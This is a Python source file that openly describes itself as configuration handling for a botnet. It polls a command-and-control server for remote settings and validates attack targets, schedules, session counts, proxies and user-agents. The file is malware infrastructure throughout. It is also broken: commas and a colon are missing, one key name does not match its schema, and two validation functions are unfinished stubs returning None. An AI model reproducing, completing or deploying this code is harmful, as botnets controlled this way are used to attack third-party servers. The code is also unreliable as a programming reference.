"""
This is the set of functions built with the aim to provide a simple
interface for the configuration management for the botnet instance.
It will provide access to the Command-and-Control server as well as
the validation for the configuration dictionary.

Created:    29 December 2016
Modified:   29 December 2016
"""

import json
import requests
from time import time

def validateConfigFile(config_file, override):
    """
    This utility is the entry point for every configuration 
    validation. It requires a configuration file to be passed 
    to be validated via C&C and using a particular schema 

    @param config_file, string - path to the configuration .txt or .json
    @return configuration, dictionary or None if error occurs
    """
    # presetting the root schema for the configuration dictionary
    # (default values provided for startup routine)
    rootSchema = {
        "last_modified" : round(time()),
        "cc_server"     : "",
        "user-agent_b"  : "ALLSAFE_UADEFAULT",
        "log_file"      : "../log.txt",

        "targets"       : []
    }
    # presetting the target schema for the configuration dictionary
    targetSchema = {
        "period"            : 1,
        "max_count"         : 1,
        "action_conditions" : { "AM" : 1, "PM" : 1, "attack_time" : "0-24", "avoid_week" : [], "avoid_month" : [] }
        "request_params"    : {},
        "sessions"          : 1
    }
    # presetting the request_params schema for the configuration dictionary
    requestSchema = {
        "method"        : "GET",
        "url"           : "",
        "proxy_server"  : { "http" : "", "https" : "" }
        "user-agent"    : "",
        "encoding"      : "UTF-8",
        "payload"       : {},
        "response"      : "raw",
        "response-header" : 0
    }

    # retrieving configuration file
    configuration = {}
    try:
        with open(config_file) as configJSON:
            configuration = json.load(configJSON)
            configJSON.close()
        # if configuration file does not exist... we return None.
    except (FileNotFoundError, IOError) as error:
        return None

    # 0. compare root schema 
    if configuration.keys() != rootSchema.keys():
        return None
    # set to default
    for setting in ['user_agent_b', 'log_file', 'targets']:
        if len(configuration[setting]) == 0:
            configuration[setting] = rootSchema[setting]

    # 1. check for updates connecting to C&C (if not override option is enabled)
    if (not override) and (len(configuration['cc_server']) != 0):
         cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, configuration['last_modified'])
         # check for remote connection success and update local configuration
         if updated:
             configuration = cc_config
             if not updateConfigFile(config_file, configuration):
                 return None
    
    # 2. compare target schema
    targetList = configuration['targets']
    if len(targetList) == 0:
        return configuration
    else:
        for i in range(0, len(targetList)):
            target = targetList[i]
            # check for schema - only few params are necessary!
            if not set(target.keys()).issubset(set(targetSchema.keys()))
                return None
            # check for custom values to be polished or set to default
            for setting in ['period', 'max_count', 'sessions']:
                if (target[setting] <= 0) or (setting not in target):
                    target[setting] = targetSchema[setting]
            # check for action conditions
            target['action_conditions'] = validateActionConditions(target, targetSchema['action_conditions'])

            # 2.1. compare request schema
            if 'request_params' not in target:
                return None
            req = validateRequestParams(target['request_params'], requestSchema)
            # if no url has been setted as a target...
            if req is None:
                return None
            # else we set default request params
            target['request_params'] = req

    return configuration



def validateCCUpdate(server, schema, last_modified):
    """
    This utility is designed to provide a minimal interface to update current 
    configuration with the remote command-and-control server.
    Please note that we assume no errors from the C&C config processing...

    @param server, string - C&C remote address
    @param schema, dictionary - default schema in case of disable
    @param last_modified, integer - timestamp representing the last modified attribute
    @return (configuration, updated), (dictionary, boolean) 
    """
    configuration = {}
    # try to perform update of the configuration from the C&C
    try:
        cc_config = requests.get(server + '/settings').json()
        # check for updated instructions
        # C&C update has priority only if it is more recent
        if cc_config['timestamp'] >= last_modified:
            if not cc_config['enable']: 
                # configuration reset
                configuration = schema
                return configuration, True
            else:
                # configuration update
                configuration = cc_config['settings']
                return configuration, True
        else:
            return configuration, False

    except Exception as e:
        # if an error occurred, we return a non updated status
        return configuration, False



def updateConfigFile(config_file, configuration):
    """
    A simple utility to overwrite the configuration file

    @param config_file, string - path to the configuration .txt or .json
    @param configuration, dictionary - updated configuration
    @return True in case of success, False otherwise
    """
    try:
        with open(config_file, 'w') as configFile:
            configFile.write(json.dumps(configuration))
            configFile.close()
            return True
    except (FileNotFoundError, IOError) as error:
        return False


def validateActionConditions(target, schema):
    """
    This utility is used to validate the action conditions or to 
    bring them to default values (attack will be always carried)

    @param target, dictionary - target dictionary
    @param schema, dictionary - default action conditions
    @return action_conditions, dictionary
    """
    # first of all we check if action conditions are set
    if 'action_conditions' not in target:
        return schema
    # check for AM / PM
    # to be continued ...
        
    return None

def validateRequestParams(request, schema):
    """
    This utility is the entry point for every configuration 
    validation. It requires a configuration file to be passed 
    to be validated via C&C and using a particular schema 

    @param config_file, string - path to the configuration .txt or .json
    @return configuration, dictionary or None if error occurs
    """
    return None